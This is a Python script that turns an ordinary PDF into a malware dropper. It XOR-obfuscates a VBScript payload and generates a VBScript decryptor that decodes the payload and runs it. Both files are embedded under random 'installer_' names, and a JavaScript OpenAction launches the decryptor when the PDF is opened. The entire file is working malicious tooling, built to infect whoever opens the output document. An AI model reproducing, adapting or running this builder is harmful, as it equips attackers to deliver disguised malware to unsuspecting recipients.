import os
import sys
import pikepdf
import random
import string
from pikepdf import Dictionary, Stream, Array, String


def xor_encrypt(data: bytes, key: int = 23) -> bytes:
    return bytes([b ^ key for b in data])


def generate_random_name(ext="vbs", length=6):
    name = ''.join(random.choices(string.ascii_letters + string.digits, k=length))
    return f"installer_{name}.{ext}"


def find_pdf():
    for file in os.listdir('.'):
        if file.lower().endswith(".pdf") and not file.startswith("autorun_"):
            return file
    return None


def deref_safe(obj):
    while isinstance(obj, pikepdf.Object):
        try:
            obj = obj.get_object()
        except AttributeError:
            break
    return obj


def embed_file_with_js(pdf_path: str, files_to_embed: list, js_target: str, output_path: str) -> None:
    try:
        print(f"[i] Opening PDF: {pdf_path}")
        with pikepdf.open(pdf_path, allow_overwriting_input=True) as pdf:
            root = deref_safe(pdf.trailer.get("/Root"))
            if not isinstance(root, Dictionary):
                raise TypeError("[!] /Root is not a Dictionary")

            # === /Names ===
            names_dict = deref_safe(root.get("/Names")) or Dictionary()
            root["/Names"] = pdf.make_indirect(names_dict)

            # === /EmbeddedFiles ===
            ef_dict = deref_safe(names_dict.get("/EmbeddedFiles")) or Dictionary()
            names_dict["/EmbeddedFiles"] = pdf.make_indirect(ef_dict)

            # === /Names array inside /EmbeddedFiles ===
            ef_array = deref_safe(ef_dict.get("/Names")) or Array()
            ef_dict["/Names"] = ef_array

            # === Embed each file ===
            for path in files_to_embed:
                fname = os.path.basename(path)
                print(f"[i] Embedding file: {fname}")
                with open(path, "rb") as f:
                    data = f.read()

                ef_stream = pdf.make_stream(data)
                ef_stream_obj = pdf.make_indirect(ef_stream)

                filespec = Dictionary({
                    "/Type": "/Filespec",
                    "/F": fname,
                    "/UF": fname,
                    "/EF": {
                        "/F": ef_stream_obj,
                        "/UF": ef_stream_obj
                    },
                    "/Desc": "Embedded file"
                })

                filespec_obj = pdf.make_indirect(filespec)
                ef_array.append(fname)
                ef_array.append(filespec_obj)

            # === Add JavaScript to launch file ===
            print("[i] Injecting JavaScript")
            js_code = f"""
try {{
    var obj = this.getDataObjectContents("{js_target}");
    if (!obj || obj.length === 0) {{
        this.exportDataObject({{ cName: "{js_target}", nLaunch: 2 }});
    }}
}} catch (e) {{
    try {{
        this.exportDataObject({{ cName: "{js_target}", nLaunch: 2 }});
    }} catch (err) {{}}
}}""".strip()

            js_stream = pdf.make_stream(js_code.encode("utf-8"))
            js_action = Dictionary({
                "/Type": "/Action",
                "/S": "/JavaScript",
                "/JS": pdf.make_indirect(js_stream)
            })

            root["/OpenAction"] = pdf.make_indirect(js_action)

            print(f"[i] Saving to {output_path}")
            pdf.save(output_path)
            print(f"[+] Created embedded PDF: {output_path}")

    except Exception as e:
        print(f"[!] Error during embedding: {e}")
        sys.exit(1)


def main():
    pdf_file = find_pdf()
    if not pdf_file:
        print("[!] No PDF found.")
        return

    if not os.path.isfile("setup.vbs"):
        print("[!] setup.vbs not found.")
        return

    decrypt_name = generate_random_name("vbs")
    encrypted_name = generate_random_name("enc")

    print(f"[i] Encrypting setup.vbs -> {encrypted_name}")
    with open("setup.vbs", "rb") as f:
        encrypted = xor_encrypt(f.read(), key=23)
    with open(encrypted_name, "wb") as f:
        f.write(encrypted)

    print(f"[i] Creating decryptor script: {decrypt_name}")
    decrypt_code = f"""
Set fso = CreateObject("Scripting.FileSystemObject")
Set input = fso.OpenTextFile("{encrypted_name}", 1)
Set output = fso.CreateTextFile("setup_decoded.vbs", True)
Do While Not input.AtEndOfStream
    line = input.Read(1)
    decoded = Chr(Asc(line) Xor 23)
    output.Write decoded
Loop
input.Close
output.Close
CreateObject("Wscript.Shell").Run "setup_decoded.vbs"
""".strip()
    with open(decrypt_name, "w", encoding="utf-8") as f:
        f.write(decrypt_code)

    output_file = f"autorun_{pdf_file}"
    embed_file_with_js(pdf_file, [decrypt_name, encrypted_name], decrypt_name, output_file)


if __name__ == '__main__':
    main()
